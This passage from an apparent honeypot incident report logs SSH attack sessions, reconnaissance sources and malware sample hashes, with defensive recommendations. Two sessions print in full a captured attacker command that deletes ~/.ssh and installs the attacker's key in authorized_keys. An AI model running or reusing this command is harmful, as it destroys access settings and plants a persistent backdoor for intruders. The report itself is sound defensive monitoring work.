| `2026-07-15 20:32:21` | `cowrie.command.failed` |
| `2026-07-15 20:37:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.208[.]128` to AbuseIPDB if not already reported
- [ ] Block `14.29.208[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f2386068935

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 20:37 |
| **Last Seen** | 2026-07-15 20:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:37:35` | `cowrie.session.connect` |
| `2026-07-15 20:37:35` | `cowrie.client.version` |
| `2026-07-15 20:37:35` | `cowrie.client.kex` |
| `2026-07-15 20:37:36` | `cowrie.login.success` |
| `2026-07-15 20:37:37` | `cowrie.session.params` |
| `2026-07-15 20:37:37` | `cowrie.command.input` |
| `2026-07-15 20:37:37` | `cowrie.log.closed` |
| `2026-07-15 20:37:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01cf0a75f3ab

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]92` |
| **First Seen** | 2026-07-15 20:46 |
| **Last Seen** | 2026-07-15 20:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:46:29` | `cowrie.session.connect` |
| `2026-07-15 20:46:29` | `cowrie.login.success` |
| `2026-07-15 20:46:30` | `cowrie.session.params` |
| `2026-07-15 20:46:30` | `cowrie.command.input` |
| `2026-07-15 20:46:31` | `cowrie.command.input` |
| `2026-07-15 20:46:31` | `cowrie.command.input` |
| `2026-07-15 20:46:32` | `cowrie.command.input` |
| `2026-07-15 20:46:32` | `cowrie.command.failed` |
| `2026-07-15 20:46:33` | `cowrie.log.closed` |
| `2026-07-15 20:46:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]92` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06b7badc121d

| Field | Detail |
|---|---|
| **Source IP** | `211.22.222[.]251` |
| **First Seen** | 2026-07-15 20:47 |
| **Last Seen** | 2026-07-15 20:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:47:45` | `cowrie.session.connect` |
| `2026-07-15 20:47:46` | `cowrie.client.version` |
| `2026-07-15 20:47:46` | `cowrie.client.kex` |
| `2026-07-15 20:47:48` | `cowrie.login.success` |
| `2026-07-15 20:47:48` | `cowrie.direct-tcpip.request` |
| `2026-07-15 20:47:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.22.222[.]251` to AbuseIPDB if not already reported
- [ ] Block `211.22.222[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0dd6c0205afe

| Field | Detail |
|---|---|
| **Source IP** | `112.197.2[.]116` |
| **First Seen** | 2026-07-15 20:47 |
| **Last Seen** | 2026-07-15 20:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:47:47` | `cowrie.session.connect` |
| `2026-07-15 20:47:47` | `cowrie.client.version` |
| `2026-07-15 20:47:47` | `cowrie.client.kex` |
| `2026-07-15 20:47:48` | `cowrie.login.success` |
| `2026-07-15 20:47:50` | `cowrie.session.params` |
| `2026-07-15 20:47:50` | `cowrie.command.input` |
| `2026-07-15 20:47:50` | `cowrie.log.closed` |
| `2026-07-15 20:47:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.197.2[.]116` to AbuseIPDB if not already reported
- [ ] Block `112.197.2[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59867f1b4ecb

| Field | Detail |
|---|---|
| **Source IP** | `24.97.253[.]246` |
| **First Seen** | 2026-07-15 20:47 |
| **Last Seen** | 2026-07-15 20:52 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:47:53` | `cowrie.session.connect` |
| `2026-07-15 20:47:54` | `cowrie.client.version` |
| `2026-07-15 20:47:54` | `cowrie.client.kex` |
| `2026-07-15 20:47:55` | `cowrie.login.success` |
| `2026-07-15 20:47:55` | `cowrie.direct-tcpip.request` |
| `2026-07-15 20:52:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.97.253[.]246` to AbuseIPDB if not already reported
- [ ] Block `24.97.253[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37cd45562c98

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]173` |
| **First Seen** | 2026-07-15 20:48 |
| **Last Seen** | 2026-07-15 20:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:48:16` | `cowrie.session.connect` |
| `2026-07-15 20:48:16` | `cowrie.client.version` |
| `2026-07-15 20:48:17` | `cowrie.client.kex` |
| `2026-07-15 20:48:17` | `cowrie.login.success` |
| `2026-07-15 20:48:18` | `cowrie.session.params` |
| `2026-07-15 20:48:18` | `cowrie.command.input` |
| `2026-07-15 20:48:18` | `cowrie.command.failed` |
| `2026-07-15 20:48:19` | `cowrie.log.closed` |
| `2026-07-15 20:48:20` | `cowrie.session.params` |
| `2026-07-15 20:48:20` | `cowrie.command.input` |
| `2026-07-15 20:48:20` | `cowrie.session.file_download` |
| `2026-07-15 20:48:20` | `cowrie.log.closed` |
| `2026-07-15 20:48:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7d873b1d50e

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]173` |
| **First Seen** | 2026-07-15 20:48 |
| **Last Seen** | 2026-07-15 20:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:48:20` | `cowrie.session.connect` |
| `2026-07-15 20:48:20` | `cowrie.client.version` |
| `2026-07-15 20:48:20` | `cowrie.client.kex` |
| `2026-07-15 20:48:21` | `cowrie.login.success` |
| `2026-07-15 20:48:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-386fbd18ae23

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]173` |
| **First Seen** | 2026-07-15 20:48 |
| **Last Seen** | 2026-07-15 20:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:48:22` | `cowrie.session.connect` |
| `2026-07-15 20:48:22` | `cowrie.client.version` |
| `2026-07-15 20:48:22` | `cowrie.client.kex` |
| `2026-07-15 20:48:23` | `cowrie.login.success` |
| `2026-07-15 20:48:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]173` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-183f3087430e

| Field | Detail |
|---|---|
| **Source IP** | `103.86.180[.]10` |
| **First Seen** | 2026-07-15 20:48 |
| **Last Seen** | 2026-07-15 20:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:48:52` | `cowrie.session.connect` |
| `2026-07-15 20:48:52` | `cowrie.client.version` |
| `2026-07-15 20:48:52` | `cowrie.client.kex` |
| `2026-07-15 20:48:53` | `cowrie.login.success` |
| `2026-07-15 20:48:54` | `cowrie.session.params` |
| `2026-07-15 20:48:54` | `cowrie.command.input` |
| `2026-07-15 20:48:54` | `cowrie.command.failed` |
| `2026-07-15 20:48:54` | `cowrie.log.closed` |
| `2026-07-15 20:48:55` | `cowrie.session.params` |
| `2026-07-15 20:48:55` | `cowrie.command.input` |
| `2026-07-15 20:48:55` | `cowrie.session.file_download` |
| `2026-07-15 20:48:55` | `cowrie.log.closed` |
| `2026-07-15 20:48:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.86.180[.]10` to AbuseIPDB if not already reported
- [ ] Block `103.86.180[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-087152c444ed

| Field | Detail |
|---|---|
| **Source IP** | `103.86.180[.]10` |
| **First Seen** | 2026-07-15 20:48 |
| **Last Seen** | 2026-07-15 20:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:48:55` | `cowrie.session.connect` |
| `2026-07-15 20:48:55` | `cowrie.client.version` |
| `2026-07-15 20:48:56` | `cowrie.client.kex` |
| `2026-07-15 20:48:57` | `cowrie.login.success` |
| `2026-07-15 20:48:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.86.180[.]10` to AbuseIPDB if not already reported
- [ ] Block `103.86.180[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-161294879c60

| Field | Detail |
|---|---|
| **Source IP** | `103.86.180[.]10` |
| **First Seen** | 2026-07-15 20:48 |
| **Last Seen** | 2026-07-15 20:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:48:57` | `cowrie.session.connect` |
| `2026-07-15 20:48:57` | `cowrie.client.version` |
| `2026-07-15 20:48:57` | `cowrie.client.kex` |
| `2026-07-15 20:48:58` | `cowrie.login.success` |
| `2026-07-15 20:48:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.86.180[.]10` to AbuseIPDB if not already reported
- [ ] Block `103.86.180[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbbd2aeca01a

| Field | Detail |
|---|---|
| **Source IP** | `183.89.208[.]174` |
| **First Seen** | 2026-07-15 20:51 |
| **Last Seen** | 2026-07-15 20:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:51:51` | `cowrie.session.connect` |
| `2026-07-15 20:51:51` | `cowrie.client.version` |
| `2026-07-15 20:51:51` | `cowrie.client.kex` |
| `2026-07-15 20:51:54` | `cowrie.login.success` |
| `2026-07-15 20:51:54` | `cowrie.direct-tcpip.request` |
| `2026-07-15 20:51:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.89.208[.]174` to AbuseIPDB if not already reported
- [ ] Block `183.89.208[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7a6f3bfd18f

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 20:54 |
| **Last Seen** | 2026-07-15 20:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 20:54:51` | `cowrie.session.connect` |
| `2026-07-15 20:54:51` | `cowrie.client.version` |
| `2026-07-15 20:54:51` | `cowrie.client.kex` |
| `2026-07-15 20:54:51` | `cowrie.login.success` |
| `2026-07-15 20:54:52` | `cowrie.session.params` |
| `2026-07-15 20:54:52` | `cowrie.command.input` |
| `2026-07-15 20:54:52` | `cowrie.log.closed` |
| `2026-07-15 20:54:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `36.104.144[.]114` | **6** | 2026-07-15 20:04 | 2026-07-15 20:36 | 12m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **5** | 2026-07-15 19:11 | 2026-07-15 20:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]163` | **3** | 2026-07-15 20:09 | 2026-07-15 20:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]155` | **3** | 2026-07-15 19:21 | 2026-07-15 19:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.79.172[.]21` | **3** | 2026-07-15 20:35 | 2026-07-15 20:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `124.225.4[.]88` | **2** | 2026-07-15 19:44 | 2026-07-15 19:46 | 2m | 0 | `T1592` | 🟢 LOW |
| `172.235.40[.]131` | **2** | 2026-07-15 19:08 | 2026-07-15 19:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `196.204.71[.]189` | **2** | 2026-07-15 20:24 | 2026-07-15 20:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | **2** | 2026-07-15 19:38 | 2026-07-15 19:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.12.128[.]30` | 1 | 2026-07-15 20:32 | 2026-07-15 20:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `130.51.22[.]249` | 1 | 2026-07-15 19:19 | 2026-07-15 19:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `144.202.92[.]17` | 1 | 2026-07-15 20:33 | 2026-07-15 20:33 | 2s | 0 | `T1592` | 🟢 LOW |
| `182.60.128[.]241` | 1 | 2026-07-15 20:36 | 2026-07-15 20:36 | 4s | 0 | `T1592` | 🟢 LOW |
| `185.242.226[.]17` | 1 | 2026-07-15 20:22 | 2026-07-15 20:23 | 10s | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]165` | 1 | 2026-07-15 19:52 | 2026-07-15 19:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]170` | 1 | 2026-07-15 19:03 | 2026-07-15 19:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]8` | 1 | 2026-07-15 20:35 | 2026-07-15 20:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]121` | 1 | 2026-07-15 20:53 | 2026-07-15 20:53 | 15s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]77` | 1 | 2026-07-15 19:01 | 2026-07-15 19:01 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `94.154.43[.]92` | 1 | 2026-07-15 20:46 | 2026-07-15 20:46 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `5850b6e589ea496b...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59da60e031a1bc0cadb4d5b62a9b3047c40c490738b5ca7ed367f4a8440561a3` | Unknown binary | `59da60e031a1bc0c...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `5b7b9a6449dcf0b779dd72210926d4567453aa40f16b473343a3aa4372798884` | ELF Binary (Linux executable) (AArch64 64-bit) | `5b7b9a6449dcf0b7...` | 38/100 | 🟢 LOW | **22/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
